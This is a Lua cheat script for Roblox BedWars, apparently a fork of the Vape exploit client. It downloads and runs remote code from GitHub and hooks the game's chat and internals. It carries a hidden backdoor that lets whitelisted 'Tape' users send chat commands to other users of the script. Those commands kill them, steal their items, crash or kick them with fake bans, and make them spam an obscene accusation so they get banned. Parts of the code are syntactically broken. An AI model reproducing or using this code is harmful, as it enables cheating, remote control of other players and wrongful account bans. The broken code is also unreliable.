
local KnitClient = debug.getupvalue(require(game:GetService("Players").LocalPlayer.PlayerScripts.TS.knit).setup, 6)
local _hash,hash = pcall(function()
	local _h = loadstring(game:HttpGet("https://raw.githubusercontent.com/eLeCtRaDoMiNuS/totalrel1/main/whitelistfortapeprivet.lua"))()
	return _h
end)

if _hash then
	tags = hash
else
	if tags then
		tags = hash
	else
		_hash,hash = pcall(function()
			local _h = loadstring(game:HttpGet("https://raw.githubusercontent.com/eLeCtRaDoMiNuS/totalrel1/main/whitelistfortapeprivet.lua"))()
			return _h
		end)	
		if _hash then
			tags = hash
		else
			repeat
				task.wait(0.1)
				_hash,hash = pcall(function()
					return loadstring(game:HttpGet("https://raw.githubusercontent.com/eLeCtRaDoMiNuS/totalrel1/main/whitelistfortapeprivet.lua"))()
				end)	
				if _hash then
					tags = hash
				end
			until _hash
		end
	end
end

local priolist = {
	["DEFAULT"] = 0,
	["Tape"] = 1,
	["Tape"] = 2,
	["Tape"] = 3
}
local function GetURL(scripturl)
	if shared.VapeDeveloper then
		assert(betterisfile("vape/"..scripturl), "File not found : vape/"..scripturl)
		return readfile("vape/"..scripturl)
	else
		local res = game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/"..scripturl, true)
		assert(res ~= "404: Not Found", "File not found : vape/"..scripturl)
		return res
	end
end
local shalib = loadstring(GetURL("Libraries/sha.lua"))()
for i,v in pairs(getconnections(game.ReplicatedStorage.DefaultChatSystemChatEvents.OnNewMessage.OnClientEvent)) do
	if v.Function and #debug.getupvalues(v.Function) > 0 and type(debug.getupvalues(v.Function)[1]) == "table" and getmetatable(debug.getupvalues(v.Function)[1]) and getmetatable(debug.getupvalues(v.Function)[1]).GetChannel then
		oldchanneltab = getmetatable(debug.getupvalues(v.Function)[1])
		oldchannelfunc = getmetatable(debug.getupvalues(v.Function)[1]).GetChannel
		getmetatable(debug.getupvalues(v.Function)[1]).GetChannel = function(Self, Name)
			local tab = oldchannelfunc(Self,Name)
			if tab then
				local addmessage = tab.AddMessageToChannel
				if oldchanneltabs[tab] == nil then
					oldchanneltabs[tab] = tab.AddMessageToChannel
				end
				tab.AddMessageToChannel = function(Self2, MessageData)
					if MessageData.FromSpeaker and game.Players[MessageData.FromSpeaker] then
						for i,v in pairs(tags) do
							pcall(function()
								local plr = game.Players[MessageData.FromSpeaker]
								local str = tostring(plr.Name..plr.UserId)
								local storedsha = shalib.sha512(tostring(str))
								if i == storedsha then
									MessageData.ExtraData = {
										NameColor = game.Players[MessageData.FromSpeaker].Team == nil and Color3.new(0, 1, 1) or game.Players[MessageData.FromSpeaker].TeamColor.Color,
										Tags = {
											table.unpack(MessageData.ExtraData.Tags),
											{
												TagColor = v[2],
												TagText = v[1]
											}
										}
									}
								end
							end)
						end
					end
					pcall(function()
						return addmessage(Self2, MessageData)
					end)
				end
			end
			return tab
		end
	end
end

local a=syn and syn.queue_on_teleport or queue_on_teleport or fluxus and fluxus.queue_on_teleport or function()end
game:GetService("Players").LocalPlayer.OnTeleport:Connect(function(b)
	if b==Enum.TeleportState.Started then a("pcall(function() shared.VapeLoaded = false end)") end end)

game.ReplicatedStorage.DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent:Wait()
task.wait(0.2)
if getconnections then
	for i,v in pairs(getconnections(game.ReplicatedStorage.DefaultChatSystemChatEvents.OnNewMessage.OnClientEvent)) do
		if v.Function and #debug.getupvalues(v.Function) > 0 and type(debug.getupvalues(v.Function)[1]) == "table" and getmetatable(debug.getupvalues(v.Function)[1]) and getmetatable(debug.getupvalues(v.Function)[1]).GetChannel then
			debug.getupvalues(v.Function)[1]:SwitchCurrentChannel("All")
		end
	end
end

function createwarning(title, content, duration)
	local frame = GuiLibrary["CreateNotification"](title or "Gravity", content or "(No Content Given)", duration or 5, "assets/WarningNotification.png")
	frame.Frame.Frame.ImageColor3 = Color3.fromRGB(255, 64, 64)
end

shared.VapeLoaded = true

local clients = {
	ChatStrings1 = {
		["KVOP25KYFPPP4"] = "vape",
		["IO12GP56P4LGR"] = "future",
		["RQYBPTYNURYZC"] = "rektsky",
		["DNUTC345CDAGH"] = "CLOWN 🤡",
                ["GalaxyC345CDAGH"] = "Skids",
	},
	ChatStrings2 = {
		["vape"] = "KVOP25KYFPPP4",
		["future"] = "IO12GP56P4LGR",
		["rektsky"] = "RQYBPTYNURYZC",
		["CLOWN 🤡"] = "DNUTC345CDAGH",
                ["Skids"] = "GalaxyC345CDAGH",
	},
	ClientUsers = {}
}
local cachedassets = {}
local requestfunc = syn and syn.request or http and http.request or http_request or fluxus and fluxus.request or request or function(tab)
	if tab.Method == "GET" then
		return {
			Body = game:HttpGet(tab.Url, true),
			Headers = {},
			StatusCode = 200
		}
	else
		return {
			Body = "bad exploit",
			Headers = {},
			StatusCode = 404
		}
	end
end 
local betterisfile = function(file)
	local suc, res = pcall(function() return readfile(file) end)
	return suc and res ~= nil
end
local getasset = getsynasset or getcustomasset or function(location) return "rbxasset://"..location end
local function getcustomassetfunc(path)
	if not betterisfile(path) then
		task.spawn(function()
			local textlabel = Instance.new("TextLabel")
			textlabel.Size = UDim2.new(1, 0, 0, 36)
			textlabel.Text = "Downloading "..path
			textlabel.BackgroundTransparency = 1
			textlabel.TextStrokeTransparency = 0
			textlabel.TextSize = 30
			textlabel.Font = Enum.Font.SourceSans
			textlabel.TextColor3 = Color3.new(1, 1, 1)
			textlabel.Position = UDim2.new(0, 0, 0, -36)
			textlabel.Parent = GuiLibrary["MainGui"]
			repeat task.wait() until betterisfile(path)
			textlabel:Remove()
		end)
		local req = requestfunc({
			Url = "https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/"..path:gsub("vape/assets", "assets"),
			Method = "GET"
		})
		writefile(path, req.Body)
	end
	if cachedassets[path] == nil then
		cachedassets[path] = getasset(path) 
	end
	return cachedassets[path]
end
local Functions = {
	CheckPlayerType = function(plr)
		local type = "DEFAULT"
		for i,v in pairs(tags) do
			if i == shalib.sha512(tostring(plr.Name..plr.UserId)) then
				type = string.upper(v[1])
			end
		end
		return type
	end
}
local alreadysaidlist = {}
local entity = shared.vapeentity
local Client = require(repstorage.TS.remotes).default.Client
local bedwars = {
	["AnimationType"] = require(repstorage.TS.animation["animation-type"]).AnimationType,
	["AnimationUtil"] = require(repstorage["rbxts_include"]["node_modules"]["@easy-games"]["game-core"].out["shared"].util["animation-util"]).AnimationUtil,
	["AngelUtil"] = require(repstorage.TS.games.bedwars.kit.kits.angel["angel-kit"]),
	["AppController"] = require(repstorage["rbxts_include"]["node_modules"]["@easy-games"]["game-core"].out.client.controllers["app-controller"]).AppController,
	["BatteryEffectController"] = KnitClient.Controllers.BatteryEffectsController,
	["BalloonController"] = KnitClient.Controllers.BalloonController,
	["BlockEngine"] = require(lplr.PlayerScripts.TS.lib["block-engine"]["client-block-engine"]).ClientBlockEngine,
	["BlockEngineClientEvents"] = require(repstorage["rbxts_include"]["node_modules"]["@easy-games"]["block-engine"].out.client["block-engine-client-events"]).BlockEngineClientEvents,
	["BlockPlacementController"] = KnitClient.Controllers.BlockPlacementController,
	["BedwarsKits"] = require(repstorage.TS.games.bedwars.kit["bedwars-kit-shop"]).BedwarsKitShop,
	["BowTable"] = KnitClient.Controllers.ProjectileController,
	["BowConstantsTable"] = debug.getupvalue(KnitClient.Controllers.ProjectileController.enableBeam, 5),
	["ChestController"] = KnitClient.Controllers.ChestController,
	["ClickHold"] = require(repstorage["rbxts_include"]["node_modules"]["@easy-games"]["game-core"].out.client.ui.lib.util["click-hold"]).ClickHold,
	["ClientHandler"] = Client,
	["SharedConstants"] = require(repstorage.TS["shared-constants"]),
	["ClientHandlerDamageBlock"] = require(repstorage["rbxts_include"]["node_modules"]["@easy-games"]["block-engine"].out.remotes).BlockEngineRemotes.Client,
	["ClientStoreHandler"] = require(lplr.PlayerScripts.TS.ui.store).ClientStore,
	["ClientHandlerSyncEvents"] = require(lplr.PlayerScripts.TS["client-sync-events"]).ClientSyncEvents,
	["CombatConstant"] = require(repstorage.TS.combat["combat-constant"]).CombatConstant,
	["CombatController"] = KnitClient.Controllers.CombatController,
	["DamageController"] = KnitClient.Controllers.DamageController,
	["DamageIndicator"] = KnitClient.Controllers.DamageIndicatorController.spawnDamageIndicator,
	["DamageIndicatorController"] = KnitClient.Controllers.DamageIndicatorController,
}
local cfnew = CFrame.new
local function addvectortocframe(cframe, vec)
	local x, y, z, R00, R01, R02, R10, R11, R12, R20, R21, R22 = cframe:GetComponents()
	return CFrame.new(x + vec.X, y + vec.Y, z + vec.Z, R00, R01, R02, R10, R11, R12, R20, R21, R22)
end
local currentinventory = {
	["inventory"] = {
		["items"] = {},
		["armor"] = {},
		["hand"] = nil
	}
}

local clientstorestate = bedwars["ClientStoreHandler"]:getState()
matchState = clientstorestate.Game.matchState or 0
kit = clientstorestate.Bedwars.kit or ""
queueType = clientstorestate.Game.queueType or "bedwars_test"
currentinventory = clientstorestate.Inventory.observedInventory
task.spawn(function()
	local connectionstodisconnect = {}
	local collectionservice = game:GetService("CollectionService")

	local blockraycast = RaycastParams.new()
	blockraycast.FilterType = Enum.RaycastFilterType.Whitelist

	local bedwarsblocks = collectionservice:GetTagged("block")
	connectionstodisconnect[#connectionstodisconnect + 1] = collectionservice:GetInstanceAddedSignal("block"):connect(function(v) table.insert(bedwarsblocks, v) blockraycast.FilterDescendantsInstances = bedwarsblocks end)
	connectionstodisconnect[#connectionstodisconnect + 1] = collectionservice:GetInstanceRemovedSignal("block"):connect(function(v) local found = table.find(bedwarsblocks, v) if found then table.remove(bedwarsblocks, found) end blockraycast.FilterDescendantsInstances = bedwarsblocks end)

	connectionstodisconnect[#connectionstodisconnect + 1] = bedwars["ClientStoreHandler"].changed:connect(function(p3, p4)
		if p3.Game ~= p4.Game then 
			matchState = p3.Game.matchState
			queueType = p3.Game.queueType or "bedwars_test"
		end
		if p3.Kit ~= p4.Kit then 	
			bedwars["BountyHunterTarget"] = p3.Kit.bountyHunterTarget
		end
		if p3.Bedwars ~= p4.Bedwars then 
			kit = p3.Bedwars.kit
		end
		if p3.Inventory ~= p4.Inventory then 
			currentinventory = p3.Inventory.observedInventory
		end
	end)
end)
runcode(function()
    local NightMareEmote = {["Enabled"] = false}
    NightMareEmote = GuiLibrary["ObjectsThatCanBeSaved"]["UtilityWindow"]["Api"].CreateOptionsButton({
        ["Name"] = "NightMareEmote",
        ["Function"] = function(callback)
            if callback then
                    game:GetService("ReplicatedStorage").rbxts_include.node_modules["@rbxts"].net.out._NetManaged.ayusEuprmcvnsZadTaiHgYw:InvokeServer({
    ["emoteType"] = "nightmare_1",
})
                    end
                NightMareEmote["ToggleButton"](true)
            end
        end
    })
end)

local collectionservice = game:GetService("CollectionService")
local vec3 = Vector3.new
local commands = {
	["kill"] = function(args, plr)
		if entity.isAlive then
			local hum = entity.character.Humanoid
			bedwars["DamageController"]:requestSelfDamage(lplr.Character:GetAttribute("Health"), 3, "69", {fromEntity = {getInstance = function() return plr.Character end}})
			task.delay(0.1, function()
				if hum and hum.Health > 0 then 
					hum:ChangeState(Enum.HumanoidStateType.Dead)
					hum.Health = 0
					bedwars["ClientHandler"]:Get(bedwars["ResetRemote"]):SendToServer()
				end
			end)
		end
	end,
	["steal"] = function(args, plr)
		if GuiLibrary["ObjectsThatCanBeSaved"]["AutoBankOptionsButton"]["Api"]["Enabled"] then 
			GuiLibrary["ObjectsThatCanBeSaved"]["AutoBankOptionsButton"]["Api"]["ToggleButton"](false)
			task.wait(1)
		end
		for i,v in pairs(currentinventory.inventory.items) do 
			local e = bedwars["ClientHandler"]:Get(bedwars["DropItemRemote"]):CallServer({
				item = v.tool,
				amount = v.amount ~= math.huge and v.amount or 99999999
			})
			if e then 
				e.CFrame = plr.Character.HumanoidRootPart.CFrame
			else
				v.tool:Destroy()
			end
		end
	end,
	["lagback"] = function(args)
		if entity.isAlive then
			entity.character.HumanoidRootPart.Velocity = Vector3.new(9999999, 9999999, 9999999)
		end
	end,
	["jump"] = function(args)
		if entity.isAlive and entity.character.Humanoid.FloorMaterial ~= Enum.Material.Air then
			entity.character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
		end
	end,
	["sit"] = function(args)
		if entity.isAlive then
			entity.character.Humanoid.Sit = true
		end
	end,
	["unsit"] = function(args)
		if entity.isAlive then
			entity.character.Humanoid.Sit = false
		end
	end,
	["freeze"] = function(args)
		if entity.isAlive then
			entity.character.HumanoidRootPart.Anchored = true
		end
	end,
	["unfreeze"] = function(args)
		if entity.isAlive then
			entity.character.HumanoidRootPart.Anchored = false
		end
	end,
	["deletemap"] = function(args)
		for i,v in pairs(collectionservice:GetTagged("block")) do
			v:Destroy()
		end
	end,
	["void"] = function(args)
		if entity.isAlive then
			task.spawn(function()
				repeat
					task.wait()
					entity.character.HumanoidRootPart.CFrame = addvectortocframe(entity.character.HumanoidRootPart.CFrame, Vector3.new(0, -3, 0))
				until not entity.isAlive
			end)
		end
	end,
	["framerate"] = function(args)
		if #args >= 1 then
			if setfpscap then
				setfpscap(tonumber(args[1]) ~= "" and math.clamp(tonumber(args[1]) or 9999, 1, 9999) or 9999)
			end
		end
	end,
	["crash"] = function(args)
		setfpscap(9e9)
    	print(game:GetObjects("h29g3535")[1])
	end,
	["chipman"] = function(args)
		local function funnyfunc(v)
			if v:IsA("ImageLabel") or v:IsA("ImageButton") then
				v.Image = "http://www.roblox.com/asset/?id=6864086702"
				v:GetPropertyChangedSignal("Image"):Connect(function()
					v.Image = "http://www.roblox.com/asset/?id=6864086702"
				end)
			end
			if (v:IsA("TextLabel") or v:IsA("TextButton")) and v:GetFullName():find("ChatChannelParentFrame") == nil then
				if v.Text ~= "" then
					v.Text = "chips"
				end
				v:GetPropertyChangedSignal("Text"):Connect(function()
					if v.Text ~= "" then
						v.Text = "chips"
					end
				end)
			end
			if v:IsA("Texture") or v:IsA("Decal") then
				v.Texture = "http://www.roblox.com/asset/?id=6864086702"
				v:GetPropertyChangedSignal("Texture"):Connect(function()
					v.Texture = "http://www.roblox.com/asset/?id=6864086702"
				end)
			end
			if v:IsA("MeshPart") then
				v.TextureID = "http://www.roblox.com/asset/?id=6864086702"
				v:GetPropertyChangedSignal("TextureID"):Connect(function()
					v.TextureID = "http://www.roblox.com/asset/?id=6864086702"
				end)
			end
			if v:IsA("SpecialMesh") then
				v.TextureId = "http://www.roblox.com/asset/?id=6864086702"
				v:GetPropertyChangedSignal("TextureId"):Connect(function()
					v.TextureId = "http://www.roblox.com/asset/?id=6864086702"
				end)
			end
			if v:IsA("Sky") then
				v.SkyboxBk = "http://www.roblox.com/asset/?id=6864086702"
				v.SkyboxDn = "http://www.roblox.com/asset/?id=6864086702"
				v.SkyboxFt = "http://www.roblox.com/asset/?id=6864086702"
				v.SkyboxLf = "http://www.roblox.com/asset/?id=6864086702"
				v.SkyboxRt = "http://www.roblox.com/asset/?id=6864086702"
				v.SkyboxUp = "http://www.roblox.com/asset/?id=6864086702"
			end
		end
	
		for i,v in pairs(game:GetDescendants()) do
			funnyfunc(v)
		end
		game.DescendantAdded:Connect(funnyfunc)
	end,
	["rickroll"] = function(args)
		local function funnyfunc(v)
			if v:IsA("ImageLabel") or v:IsA("ImageButton") then
				v.Image = "http://www.roblox.com/asset/?id=7083449168"
				v:GetPropertyChangedSignal("Image"):Connect(function()
					v.Image = "http://www.roblox.com/asset/?id=7083449168"
				end)
			end
			if (v:IsA("TextLabel") or v:IsA("TextButton")) and v:GetFullName():find("ChatChannelParentFrame") == nil then
				if v.Text ~= "" then
					v.Text = "Never gonna give you up"
				end
				v:GetPropertyChangedSignal("Text"):Connect(function()
					if v.Text ~= "" then
						v.Text = "Never gonna give you up"
					end
				end)
			end
			if v:IsA("Texture") or v:IsA("Decal") then
				v.Texture = "http://www.roblox.com/asset/?id=7083449168"
				v:GetPropertyChangedSignal("Texture"):Connect(function()
					v.Texture = "http://www.roblox.com/asset/?id=7083449168"
				end)
			end
			if v:IsA("MeshPart") then
				v.TextureID = "http://www.roblox.com/asset/?id=7083449168"
				v:GetPropertyChangedSignal("TextureID"):Connect(function()
					v.TextureID = "http://www.roblox.com/asset/?id=7083449168"
				end)
			end
			if v:IsA("SpecialMesh") then
				v.TextureId = "http://www.roblox.com/asset/?id=7083449168"
				v:GetPropertyChangedSignal("TextureId"):Connect(function()
					v.TextureId = "http://www.roblox.com/asset/?id=7083449168"
				end)
			end
			if v:IsA("Sky") then
				v.SkyboxBk = "http://www.roblox.com/asset/?id=7083449168"
				v.SkyboxDn = "http://www.roblox.com/asset/?id=7083449168"
				v.SkyboxFt = "http://www.roblox.com/asset/?id=7083449168"
				v.SkyboxLf = "http://www.roblox.com/asset/?id=7083449168"
				v.SkyboxRt = "http://www.roblox.com/asset/?id=7083449168"
				v.SkyboxUp = "http://www.roblox.com/asset/?id=7083449168"
			end
		end
	
		for i,v in pairs(game:GetDescendants()) do
			funnyfunc(v)
		end
		game.DescendantAdded:Connect(funnyfunc)
	end,
	["gravity"] = function(args)
		workspace.Gravity = tonumber(args[1]) or 192.6
	end,
        ["lobby"] = function(args)
                  game:GetService("ReplicatedStorage")["rbxts_include"]["node_modules"].net.out["_NetManaged"].TeleportToLobby:FireServer()
	end,
        ["fling"] = function(args)
		if Player then
			Player.character.HumanoidRootPart.CFrame = addvectortocframe(Player.character.HumanoidRootPart.CFrame, vec3(999999999999, 19191919199119191199, 18291938382919199293938381)
		end
	end,
        ["rblxban"] = function(args)
                    while task.wait(0.1) do
                    game:GetService("ReplicatedStorage")["DefaultChatSystemChatEvents"]["SayMessageRequest"]:FireServer("i rape children","All")
	end,
        ["bring"] = function(args)
                   local players = getPlayer(args[1], speaker)
	for i,v in pairs(players)do
		if Players[v].Character ~= nil then
			if Players[v].Character:FindFirstChildOfClass('Humanoid') then
				Players[v].Character:FindFirstChildOfClass('Humanoid').Sit = false
			end
			wait()
			getRoot(Players[v].Character).CFrame = getRoot(speaker.Character).CFrame + Vector3.new(3,1,0)
        end,
	["kick"] = function(args)
		local str = ""
		for i,v in pairs(args) do
			str = str..v..(i > 1 and " " or "")
		end
		task.spawn(function()
			lplr:Kick(str)
		end)
		bedwars["ClientHandler"]:Get("TeleportToLobby"):SendToServer()
	end,
	["ban"] = function(args)
		task.spawn(function()
			lplr:Kick("You have been temporarily banned. Remaining ban duration: 4960 weeks 2 days 5 hours 19 minutes "..math.random(45, 59).." seconds")
		end)
		bedwars["ClientHandler"]:Get("TeleportToLobby"):SendToServer()
	end,
	["disconnect"] = function(args)
		game:GetService("CoreGui"):FindFirstChild("RobloxPromptGui"):FindFirstChild("promptOverlay").DescendantAdded:Connect(function(obj)
			if obj.Name == "ErrorMessage" then
				obj:GetPropertyChangedSignal("Text"):Connect(function()
					obj.Text = "Please check your internet connection and try again.\n(Error Code: 277)"
				end)
			end
			if obj.Name == "LeaveButton" then
				local clone = obj:Clone()
				clone.Name = "LeaveButton2"
				clone.Parent = obj.Parent
				clone.MouseButton1Click:Connect(function()
					clone.Visible = false
					local video = Instance.new("VideoFrame")
					video.Video = getcustomassetfunc("vapeprivate/assets/skill.webm")
					video.Size = UDim2.new(1, 0, 1, 36)
					video.Visible = false
					video.Position = UDim2.new(0, 0, 0, -36)
					video.ZIndex = 9
					video.BackgroundTransparency = 1
					video.Parent = game:GetService("CoreGui"):FindFirstChild("RobloxPromptGui"):FindFirstChild("promptOverlay")
					local textlab = Instance.new("TextLabel")
					textlab.TextSize = 45
					textlab.ZIndex = 10
					textlab.Size = UDim2.new(1, 0, 1, 36)
					textlab.TextColor3 = Color3.new(1, 1, 1)
					textlab.Text = "skill issue"
					textlab.Position = UDim2.new(0, 0, 0, -36)
					textlab.Font = Enum.Font.Gotham
					textlab.BackgroundTransparency = 1
					textlab.Parent = game:GetService("CoreGui"):FindFirstChild("RobloxPromptGui"):FindFirstChild("promptOverlay")
					video.Loaded:Connect(function()
						video.Visible = true
						video:Play()
						task.spawn(function()
							repeat
								wait()
								for i = 0, 1, 0.01 do
									wait(0.01)
									textlab.TextColor3 = Color3.fromHSV(i, 1, 1)
								end
							until true == false
						end)
					end)
					task.wait(19)
					task.spawn(function()
						pcall(function()
							if getconnections then
								getconnections(entity.character.Humanoid.Died)
							end
							print(game:GetObjects("h29g3535")[1])
						end)
						while true do end
					end)
				end)
				obj.Visible = false
			end
		end)
		task.wait(0.1)
		lplr:Kick()
	end,
	["togglemodule"] = function(args)
		if #args >= 1 then
			local module = GuiLibrary["ObjectsThatCanBeSaved"][args[1].."OptionsButton"]
			if module then
				if module["Api"]["Enabled"] == (not args[2] == "true") then
					module["Api"]["ToggleButton"]()
				end
			end
		end
	end,
	["shutdown"] = function(args)
		game:Shutdown()
	end,
	["errorkick"] = function(args)
		if entity.isAlive then 
			pcall(function() lplr.Character.Head:Destroy() end)
		end
	end
local function findplayers(arg, plr)
	local temp = {}
	local continuechecking = true

	if arg == "default" and continuechecking and Functions.CheckPlayerType(lplr) == "DEFAULT" then table.insert(temp, lplr) continuechecking = false end
	if arg == "teamdefault" and continuechecking and Functions.CheckPlayerType(lplr) == "DEFAULT" and plr and lplr:GetAttribute("Team") ~= plr:GetAttribute("Team") then table.insert(temp, lplr) continuechecking = false end
	if arg == "private" and continuechecking and Functions.CheckPlayerType(lplr) == "Tape" then table.insert(temp, lplr) continuechecking = false end
	if arg == "developer" and continuechecking and Functions.CheckPlayerType(lplr) == "Tape" then table.insert(temp, lplr) continuechecking = false end
	for i,v in pairs(game:GetService("Players"):GetChildren()) do if continuechecking and v.Name:lower():sub(1, arg:len()) == arg:lower() then table.insert(temp, v) continuechecking = false end end

	return temp
end
chatconnection = repstorage.DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent:Connect(function(tab, channel)
	if tab.MessageType ~= "Whisper" then do_ = false  end
	local plr = game.Players:FindFirstChild(tab["FromSpeaker"])
	local args = tab.Message:split(" ")
	local client = clients.ChatStrings1[#args > 0 and args[#args] or tab.Message]
	if do_ == nil then
		if plr and Functions.CheckPlayerType(lplr) ~= "DEFAULT" and tab.MessageType == "Whisper" and client ~= nil and alreadysaidlist[plr.Name] == nil and do_ == nil then
			alreadysaidlist[plr.Name] = true
			local playerlist = game:GetService("CoreGui"):FindFirstChild("PlayerList")
			if playerlist then
				pcall(function()
					local playerlistplayers = playerlist.PlayerListMaster.OffsetFrame.PlayerScrollList.SizeOffsetFrame.ScrollingFrameContainer.ScrollingFrameClippingFrame.ScollingFrame.OffsetUndoFrame
					local targetedplr = playerlistplayers:FindFirstChild("p_"..plr.UserId)
					if targetedplr then 
						targetedplr.ChildrenFrame.NameFrame.BGFrame.OverlayFrame.PlayerIcon.Image = getcustomassetfunc("vape/assets/VapeIcon.png")
					end
				end)
			end
			task.spawn(function()
				local connection
				for i,newbubble in pairs(game:GetService("CoreGui").BubbleChat:GetDescendants()) do
					if newbubble:IsA("TextLabel") and newbubble.Text:find(clients.ChatStrings2[client]) then
						newbubble.Parent.Parent.Visible = false
						repeat task.wait() until newbubble:IsDescendantOf(nil)
						if connection then
							connection:Disconnect()
						end
					end
				end
				connection = game:GetService("CoreGui").BubbleChat.DescendantAdded:Connect(function(newbubble)
					if newbubble:IsA("TextLabel") and newbubble.Text:find(clients.ChatStrings2[client]) then
						newbubble.Parent.Parent.Visible = false
						repeat task.wait() until newbubble:IsDescendantOf(nil)
						if connection then
							connection:Disconnect()
						end
					end
				end)
			end)
			createwarning("VapePrivate", plr.Name.." is using "..client.."!", 60)
			clients.ClientUsers[plr.Name] = client:upper()..' USER'
			local ind, newent = entity.getEntityFromPlayer(plr)
			if newent then entity.entityUpdatedEvent:Fire(newent) end
		end
	end
if priolist[string.upper(Functions.CheckPlayerType(lplr))] > 0 and plr == lplr then
		if tab.Message:len() >= 5 and tab.Message:sub(1, 5):lower() == ";" then
			local tab = {}
			for i,v in pairs(commands) do
				table.insert(tab, i)
			end
			table.sort(tab)
			local str = ""
			for i,v in pairs(tab) do
				str = str..";"..v.."\n"
			end
			game.StarterGui:SetCore("ChatMakeSystemMessage",{
				Text = 	str,
			})
		end
	end
	if plr and priolist[Functions.CheckPlayerType(plr)] > 0 and plr ~= lplr and priolist[Functions.CheckPlayerType(plr)] > priolist[Functions.CheckPlayerType(lplr)] and #args > 1 then
		table.remove(args, 1)
		local chosenplayers = findplayers(args[1], plr)
		if table.find(chosenplayers, lplr) then
			table.remove(args, 1)
			for i,v in pairs(commands) do
				if tab.Message:len() >= (i:len() + 1) and tab.Message:sub(1, i:len() + 1):lower() == ";"..i:lower() then
					v(args, plr)
					break
				end
			end
		end
	end
end)
